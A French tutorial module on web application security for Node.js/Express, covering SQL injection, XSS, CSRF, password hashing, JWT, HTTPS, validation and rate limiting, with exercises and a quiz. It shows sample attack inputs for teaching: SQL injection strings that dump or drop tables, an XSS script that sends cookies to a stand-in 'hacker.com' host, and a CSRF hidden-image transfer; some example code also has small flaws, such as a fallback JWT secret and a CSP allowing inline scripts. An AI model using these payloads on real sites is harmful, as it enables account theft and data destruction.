# 🔒 COURS 9 : SÉCURITÉ

## Protéger votre application web

**Durée :** 1-2 heures  
**Niveau :** Avancé  
**Prérequis :** Cours 1-8

---

## 📋 SOMMAIRE

1. [Introduction à la sécurité](#1-intro)
2. [Injection SQL](#2-sql-injection)
3. [XSS (Cross-Site Scripting)](#3-xss)
4. [CSRF (Cross-Site Request Forgery)](#4-csrf)
5. [Authentification](#5-auth)
6. [HTTPS et Encryption](#6-https)
7. [Validation des données](#7-validation)
8. [Bonnes pratiques](#8-bonnes-pratiques)
9. [Exercices](#9-exercices)
10. [Quiz](#10-quiz)

---

## 1. INTRODUCTION À LA SÉCURITÉ {#1-intro}

### 🎯 Pourquoi la sécurité ?

**Conséquences d'une faille de sécurité :**
- 💰 Vol de données (clients, finances)
- 🚨 Attaque du serveur
- 📉 Perte de confiance
- ⚖️ Amendes légales (RGPD)
- 🔓 Compte hackés

### 🛡️ Principes de sécurité

1. **Ne jamais faire confiance aux données utilisateur**
2. **Valider et sanitiser TOUTES les entrées**
3. **Chiffrer les données sensibles**
4. **Limiter les privilèges**
5. **Mettre à jour régulièrement**

---

## 2. INJECTION SQL {#2-sql-injection}

### 💉 Qu'est-ce que l'injection SQL ?

L'**injection SQL** est une attaque où l'attaquant insère du code SQL malveillant dans vos requêtes.

### ❌ Code VULNÉRABLE

```javascript
// ❌ DANGER : Injection SQL possible
app.get('/user', async (req, res) => {
  const { id } = req.query;
  
  // Requête SQL construite avec concaténation
  const query = `SELECT * FROM users WHERE id = ${id}`;
  const result = await pool.query(query);
  
  res.json(result.rows);
});
```

**Attaque :**
```
GET /user?id=1 OR 1=1
→ SELECT * FROM users WHERE id = 1 OR 1=1
→ Retourne TOUS les users !

GET /user?id=1; DROP TABLE users;--
→ SELECT * FROM users WHERE id = 1; DROP TABLE users;--
→ Supprime la table users !
```

### ✅ Code SÉCURISÉ

```javascript
// ✅ BON : Requêtes paramétrées
app.get('/user', async (req, res) => {
  const { id } = req.query;
  
  // Utiliser des placeholders ($1, $2, etc.)
  const query = 'SELECT * FROM users WHERE id = $1';
  const result = await pool.query(query, [id]);
  
  res.json(result.rows);
});
```

**Pourquoi c'est sûr ?**
```
GET /user?id=1 OR 1=1

PostgreSQL échappe automatiquement :
→ SELECT * FROM users WHERE id = '1 OR 1=1'
→ Cherche un user avec l'ID littéral "1 OR 1=1"
→ Aucun user trouvé = sûr !
```

### 🛡️ Protection ORM

Utiliser un ORM (Object-Relational Mapping) comme **Sequelize** ou **TypeORM** :

```javascript
// Sequelize (ORM)
const user = await User.findByPk(id);
// Génère automatiquement une requête sécurisée
```

---

## 3. XSS (CROSS-SITE SCRIPTING) {#3-xss}

### 🎭 Qu'est-ce que XSS ?

**XSS** = Injection de code JavaScript malveillant dans votre page web.

### ❌ Code VULNÉRABLE

```javascript
// ❌ DANGER : XSS
app.get('/search', (req, res) => {
  const { query } = req.query;
  
  res.send(`
    <h1>Résultats pour : ${query}</h1>
  `);
});
```

**Attaque :**
```
GET /search?query=<script>alert('Hack!')</script>

Page affichée :
<h1>Résultats pour : <script>alert('Hack!')</script></h1>
                      ↑ Script exécuté !
```

**Pire attaque :**
```html
<script>
  // Voler les cookies
  fetch('https://hacker.com/steal?cookie=' + document.cookie);
  
  // Rediriger vers un site malveillant
  window.location = 'https://phishing.com';
</script>
```

### ✅ Code SÉCURISÉ

#### **Solution 1 : Échapper le HTML**

```javascript
const escapeHtml = (text) => {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

app.get('/search', (req, res) => {
  const { query } = req.query;
  
  res.send(`
    <h1>Résultats pour : ${escapeHtml(query)}</h1>
  `);
});
```

**Résultat :**
```
GET /search?query=<script>alert('Hack!')</script>

Page affichée :
<h1>Résultats pour : &lt;script&gt;alert('Hack!')&lt;/script&gt;</h1>
                      ↑ Affiché comme texte, pas exécuté
```

#### **Solution 2 : CSP (Content Security Policy)**

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"]
  }
}));
```

#### **Solution 3 : Sanitizer library**

```javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.post('/comment', (req, res) => {
  const { comment } = req.body;
  
  // Nettoyer le HTML
  const clean = DOMPurify.sanitize(comment);
  
  // Sauvegarder en DB
  await pool.query(
    'INSERT INTO comments (text) VALUES ($1)',
    [clean]
  );
  
  res.json({ message: 'Commentaire ajouté' });
});
```

---

## 4. CSRF (CROSS-SITE REQUEST FORGERY) {#4-csrf}

### 🎣 Qu'est-ce que CSRF ?

**CSRF** = Forcer un utilisateur authentifié à faire une action sans son consentement.

### 🔴 Scénario d'attaque

1. **Alice est connectée à sa banque** (cookie de session actif)
2. **Alice visite un site malveillant** `evil.com`
3. **Le site charge une image cachée :**
```html
<img src="https://banque.com/transfer?to=hacker&amount=1000">
```
4. **Le navigateur envoie la requête avec les cookies d'Alice**
5. **L'argent est transféré sans qu'Alice le sache**

### ✅ Protection CSRF

#### **Solution 1 : CSRF Token**

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Ajouter le middleware
app.use(csrfProtection);

// Route qui nécessite un token
app.post('/transfer', csrfProtection, (req, res) => {
  // La requête sera rejetée sans token valide
  const { to, amount } = req.body;
  
  // Faire le transfert...
  res.json({ message: 'Transfert effectué' });
});

// Route pour obtenir le token
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});
```

**Formulaire HTML :**
```html
<form method="POST" action="/transfer">
  <!-- Token CSRF caché -->
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  
  <input name="to" placeholder="Destinataire">
  <input name="amount" placeholder="Montant">
  <button type="submit">Transférer</button>
</form>
```

#### **Solution 2 : SameSite Cookies**

```javascript
app.use(session({
  secret: 'secret-key',
  cookie: {
    sameSite: 'strict',  // Strict ou Lax
    secure: true,        // HTTPS seulement
    httpOnly: true       // Pas accessible en JS
  }
}));
```

---

## 5. AUTHENTIFICATION {#5-auth}

### 🔐 Hashing de mots de passe

**❌ JAMAIS stocker en clair !**

```javascript
// ❌ DANGER : Mot de passe en clair
await pool.query(
  'INSERT INTO users (email, password) VALUES ($1, $2)',
  [email, password]
);
```

**✅ Toujours hasher**

```javascript
const bcrypt = require('bcrypt');

// Créer un user
app.post('/register', async (req, res) => {
  const { email, password } = req.body;
  
  // 1. Hasher le mot de passe
  const saltRounds = 10;
  const hashedPassword = await bcrypt.hash(password, saltRounds);
  
  // 2. Sauvegarder le hash
  await pool.query(
    'INSERT INTO users (email, password_hash) VALUES ($1, $2)',
    [email, hashedPassword]
  );
  
  res.json({ message: 'User créé' });
});

// Login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // 1. Récupérer le user
  const result = await pool.query(
    'SELECT * FROM users WHERE email = $1',
    [email]
  );
  
  if (result.rowCount === 0) {
    return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
  }
  
  const user = result.rows[0];
  
  // 2. Comparer le mot de passe
  const match = await bcrypt.compare(password, user.password_hash);
  
  if (!match) {
    return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
  }
  
  // 3. Créer une session
  req.session.userId = user.id;
  
  res.json({ message: 'Connecté' });
});
```

### 🎫 JWT (JSON Web Tokens)

```javascript
const jwt = require('jsonwebtoken');

const SECRET_KEY = process.env.JWT_SECRET;

// Créer un token
app.post('/login', async (req, res) => {
  // ... vérifier email/password
  
  // Créer le token
  const token = jwt.sign(
    { userId: user.id, email: user.email },
    SECRET_KEY,
    { expiresIn: '24h' }
  );
  
  res.json({ token });
});

// Middleware d'authentification
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'Non authentifié' });
  }
  
  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    req.userId = decoded.userId;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Token invalide' });
  }
};

// Route protégée
app.get('/profile', authenticate, async (req, res) => {
  const user = await pool.query(
    'SELECT id, email, nom FROM users WHERE id = $1',
    [req.userId]
  );
  
  res.json(user.rows[0]);
});
```

---

## 6. HTTPS ET ENCRYPTION {#6-https}

### 🔒 Pourquoi HTTPS ?

**HTTP** = Données en clair (lisibles par tous)  
**HTTPS** = Données chiffrées (SSL/TLS)

```
HTTP :
User → [password: "secret123"] → Serveur
         ↑ Visible par les hackers !

HTTPS :
User → [kJ#mP9@xL2...] → Serveur
         ↑ Chiffré
```

### 🎫 Obtenir un certificat SSL

**Option 1 : Let's Encrypt (gratuit)**
```bash
sudo certbot --nginx -d votredomaine.com
```

**Option 2 : Cloudflare (gratuit)**
- Ajouter votre domaine sur Cloudflare
- SSL automatique

### 🔧 Configurer HTTPS en Node.js

```javascript
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('./ssl/private.key'),
  cert: fs.readFileSync('./ssl/certificate.crt')
};

https.createServer(options, app).listen(443, () => {
  console.log('HTTPS serveur sur port 443');
});
```

### 🔄 Rediriger HTTP → HTTPS

```javascript
const express = require('express');
const app = express();

// Forcer HTTPS
app.use((req, res, next) => {
  if (req.protocol === 'http') {
    res.redirect(301, `https://${req.headers.host}${req.url}`);
  } else {
    next();
  }
});
```

---

## 7. VALIDATION DES DONNÉES {#7-validation}

### ✅ Valider TOUTES les entrées

**❌ Sans validation :**
```javascript
app.post('/user', async (req, res) => {
  const { nom, email, age } = req.body;
  
  // Aucune validation !
  await pool.query(
    'INSERT INTO users (nom, email, age) VALUES ($1, $2, $3)',
    [nom, email, age]
  );
});
```

**✅ Avec validation :**
```javascript
const Joi = require('joi');

const userSchema = Joi.object({
  nom: Joi.string().min(2).max(100).required(),
  email: Joi.string().email().required(),
  age: Joi.number().integer().min(18).max(120).required()
});

app.post('/user', async (req, res) => {
  // Valider
  const { error, value } = userSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ 
      error: error.details[0].message 
    });
  }
  
  // Insérer
  await pool.query(
    'INSERT INTO users (nom, email, age) VALUES ($1, $2, $3)',
    [value.nom, value.email, value.age]
  );
  
  res.json({ message: 'User créé' });
});
```

### 📧 Validation d'email

```javascript
const isValidEmail = (email) => {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
};

if (!isValidEmail(email)) {
  return res.status(400).json({ error: 'Email invalide' });
}
```

---

## 8. BONNES PRATIQUES {#8-bonnes-pratiques}

### ✅ Checklist de sécurité

- [ ] **Requêtes paramétrées** (pas de concaténation SQL)
- [ ] **Échapper le HTML** (prévenir XSS)
- [ ] **CSRF protection** (tokens)
- [ ] **Hasher les mots de passe** (bcrypt)
- [ ] **HTTPS** en production
- [ ] **Valider toutes les entrées**
- [ ] **Rate limiting** (limiter les requêtes)
- [ ] **Helmet.js** (headers de sécurité)
- [ ] **Pas de secrets dans le code** (variables d'env)
- [ ] **Logs des erreurs** (sans exposer les détails)
- [ ] **Mettre à jour les dépendances**

### 🛡️ Helmet.js

```javascript
const helmet = require('helmet');

app.use(helmet());  // Active toutes les protections

// Ou configurer manuellement
app.use(helmet({
  contentSecurityPolicy: true,
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: true,
  crossOriginResourcePolicy: true,
  dnsPrefetchControl: true,
  frameguard: true,
  hidePoweredBy: true,
  hsts: true,
  ieNoOpen: true,
  noSniff: true,
  originAgentCluster: true,
  permittedCrossDomainPolicies: true,
  referrerPolicy: true,
  xssFilter: true
}));
```

### ⏱️ Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,  // Max 100 requêtes par IP
  message: 'Trop de requêtes, réessayez plus tard'
});

// Appliquer à toutes les routes
app.use(limiter);

// Ou seulement au login
app.post('/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5  // Max 5 tentatives de login
}), async (req, res) => {
  // ...
});
```

### 🔑 Variables d'environnement

```javascript
// ❌ DANGER : Secrets dans le code
const DB_PASSWORD = 'motdepasse123';
const JWT_SECRET = 'secret';

// ✅ BON : Variables d'environnement
require('dotenv').config();

const DB_PASSWORD = process.env.DB_PASSWORD;
const JWT_SECRET = process.env.JWT_SECRET;
```

**fichier : .env**
```
DB_PASSWORD=motdepasse123
JWT_SECRET=secret-très-compliqué-à-deviner
```

**fichier : .gitignore**
```
.env
node_modules/
```

---

## 9. EXERCICES {#9-exercices}

### ✏️ Exercice 1 : Sécuriser une route (Facile)

**Consigne :**
Corrigez cette route vulnérable à l'injection SQL :

```javascript
app.get('/product', async (req, res) => {
  const { id } = req.query;
  const result = await pool.query(`SELECT * FROM products WHERE id = ${id}`);
  res.json(result.rows);
});
```

<details>
<summary>💡 Voir la solution</summary>

```javascript
app.get('/product', async (req, res) => {
  const { id } = req.query;
  
  // Validation
  if (!id || isNaN(id)) {
    return res.status(400).json({ error: 'ID invalide' });
  }
  
  // Requête paramétrée
  const result = await pool.query(
    'SELECT * FROM products WHERE id = $1',
    [id]
  );
  
  res.json(result.rows);
});
```
</details>

---

### ✏️ Exercice 2 : Système de login sécurisé (Difficile)

**Consigne :**
Créez un système de login avec :
- Hashing du mot de passe
- JWT token
- Rate limiting (max 5 tentatives)

<details>
<summary>💡 Voir la solution</summary>

```javascript
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const SECRET = process.env.JWT_SECRET || 'secret';

// Rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Trop de tentatives, réessayez dans 15 min'
});

// Register
app.post('/register', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Validation
    if (!email || !password) {
      return res.status(400).json({ error: 'Email et password requis' });
    }
    
    if (password.length < 8) {
      return res.status(400).json({ 
        error: 'Mot de passe minimum 8 caractères' 
      });
    }
    
    // Hasher
    const hash = await bcrypt.hash(password, 10);
    
    // Sauvegarder
    await pool.query(
      'INSERT INTO users (email, password_hash) VALUES ($1, $2)',
      [email, hash]
    );
    
    res.json({ message: 'User créé' });
    
  } catch (error) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// Login
app.post('/login', loginLimiter, async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Récupérer user
    const result = await pool.query(
      'SELECT * FROM users WHERE email = $1',
      [email]
    );
    
    if (result.rowCount === 0) {
      return res.status(401).json({ 
        error: 'Email ou mot de passe incorrect' 
      });
    }
    
    const user = result.rows[0];
    
    // Vérifier password
    const match = await bcrypt.compare(password, user.password_hash);
    
    if (!match) {
      return res.status(401).json({ 
        error: 'Email ou mot de passe incorrect' 
      });
    }
    
    // Créer token
    const token = jwt.sign(
      { userId: user.id, email: user.email },
      SECRET,
      { expiresIn: '24h' }
    );
    
    res.json({ token });
    
  } catch (error) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// Route protégée
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'Non authentifié' });
  }
  
  try {
    const decoded = jwt.verify(token, SECRET);
    req.userId = decoded.userId;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Token invalide' });
  }
};

app.get('/profile', authenticate, async (req, res) => {
  const result = await pool.query(
    'SELECT id, email FROM users WHERE id = $1',
    [req.userId]
  );
  
  res.json(result.rows[0]);
});

app.listen(3000);
```
</details>

---

## 10. QUIZ {#10-quiz}

### ❓ Question 1

Comment prévenir l'injection SQL ?

A) Valider les entrées  
B) Utiliser des requêtes paramétrées ($1, $2)  
C) Échapper le SQL  
D) Toutes les réponses

<details>
<summary>✅ Réponse</summary>
**B** - Requêtes paramétrées (+ validation en bonus).
</details>

---

### ❓ Question 2

Faut-il stocker les mots de passe en clair ?

A) Oui, pour pouvoir les récupérer  
B) Non, toujours les hasher  
C) Oui, si la DB est sécurisée  
D) Ça dépend

<details>
<summary>✅ Réponse</summary>
**B** - JAMAIS en clair, toujours hasher avec bcrypt.
</details>

---

## 🎓 FÉLICITATIONS !

Vous avez terminé le Cours 9 ! 🎉

**Continuez vers :**
- ✅ **COURS 10** : Déploiement (dernier cours !)

**Compétences acquises :**
- ✅ Prévenir injection SQL
- ✅ Protéger contre XSS
- ✅ CSRF protection
- ✅ Authentification sécurisée
- ✅ HTTPS
- ✅ Validation des données
- ✅ Bonnes pratiques de sécurité

**Félicitations ! 🚀**
